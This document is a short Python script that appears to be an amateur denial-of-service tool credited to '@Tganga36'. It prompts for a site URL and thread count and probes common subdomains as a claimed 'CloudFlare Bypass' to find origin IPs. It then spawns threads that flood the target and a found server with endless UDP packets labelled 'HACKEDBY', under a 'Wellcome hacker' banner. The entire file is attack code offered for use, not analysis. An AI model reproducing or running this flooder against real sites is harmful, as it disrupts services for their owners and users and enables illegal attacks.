import os , platform
from colorama import Fore , init , Style
import socket
import time
import sys
import _thread
def ddos():
    data0 = platform.uname()[0]
    if data0 == 'Linux':
        os.system('clear')
    else:
        os.system('cls')
    print()
    site = input("Enter your site url => ")
    thread_count = input("Enter your thread => ")
    print()
    ip = socket.gethostbyname(site)
    UDP_PORT = 80
    MESSAGE = 'HACKEDBY'
    print(Fore.RED+"[!]"+Fore.WHITE+" UDP target IP:", ip)
    print(Fore.RED +"[!]"+Fore.WHITE+" UDP target port:", UDP_PORT)
    time.sleep(3)
    print()
    print(Fore.YELLOW + '[!]' + Fore.WHITE +"checking Clouder...")
    time.sleep(2)
    print()
    subdom = ['ftp' , 'cpanel' , 'robots' , 'shop' , 'api' , 'server' , 'secure' , 'mysql' , 'chat' , 'sql']
    
    for sub in subdom:
        try:
            http = str(sub) + "." + str(site)
            bypass = socket.gethostbyname(str(http))
            print(" [!] CloudFlare Bypass " + str(bypass) + ' | ' + str(http))
            time.sleep(3)
            if sub == 'server':
                ip2 = bypass
        except:
            pass

    def ddos(i):
        while 1:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
            print(Fore.YELLOW +'[+]'+Fore.WHITE+"Packet Sent" + ip + ':' + '80')
            try:
                sock.sendto(bytes(MESSAGE,"UTF-8"), (ip2, UDP_PORT))
                print(Fore.RED +'[+]'+Fore.WHITE+"Packet Sent" + ip2 + ':' + '80')
            except:
                pass
           
            
    for i in range(int(thread_count)):
        try:
            _thread.start_new_thread(ddos, ("Thread-" + str(i),))
        except KeyboardInterrupt:
            sys.exit(0)
        while 1:
            pass


def banner():
    init()
    data0 = platform.uname()[0]
    if data0 == 'Linux':
        os.system('clear')
    else:
        os.system('cls')
    print()
    if data0 == 'Linux':
        os.system("""echo "                         !¶     ¶     ¶¢
           ¶¶¶¶¶¶¶        ¶¢   ¶   ø¶
          ¶¶     ø¶¶¶      oø  ø  øo
          ¶7       ¶¶¶      1   1    1o
       ¶¶¶¶¶¶¶      ¶¶¶7        1o¶¶¶ø
       ¶¶¶¶¶¶¶         ¶¶¶¶¶¶¶¶  1
     o¶¶¶¶¶¶¶¶¶ø                  o$¢
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         ¢  1ø   1¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶o       1#   ¶
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶       ¶    o¶ 
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶¶¶¶¶¶¶¶ 
       ¶¶¶¶¶¶¶¶
" | lolcat""")
    else:
        print('''                         !¶     ¶     ¶¢
           ¶¶¶¶¶¶¶        ¶¢   ¶   ø¶
          ¶¶     ø¶¶¶      oø  ø  øo
          ¶7       ¶¶¶      1   1    1o
       ¶¶¶¶¶¶¶      ¶¶¶7        1o¶¶¶ø
       ¶¶¶¶¶¶¶         ¶¶¶¶¶¶¶¶  1
     o¶¶¶¶¶¶¶¶¶ø                  o$¢
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         ¢  1ø   1¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶o       1#   ¶
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶       ¶    o¶ 
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶
  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶¶¶¶¶¶¶¶ 
       ¶¶¶¶¶¶¶¶
''')
    

    print()
    print()
    time.sleep(0.5)
    print(Fore.LIGHTGREEN_EX + '[!]' + Fore.LIGHTYELLOW_EX + ' Wellcome hacker :)')
    print()
    if data0 == 'Linux':
        os.system('echo "created By : @Tganga36" | lolcat')
    else:
        print("created By : @Tganga36")
    
    print()
    time.sleep(0.7)
    def inp():
        x = input(Fore.RED + "[$]" + Fore.WHITE + " Ready?(Yes , No):")
        if x == 'Yes'or x == 'YEs' or x == 'YES' or x == 'yes' or x == 'y' :
            ddos()
            time.sleep(2)
        elif x == 'No' or x == 'nO' or x == 'NO' or x == 'no' or x == 'n' :
            print()
            print('Ok GoodBye ;) ')
        else:
            print()
            print(Fore.YELLOW + "[?]"+Fore.WHITE+" what ??")
            print()
            inp()
    inp()        


banner()
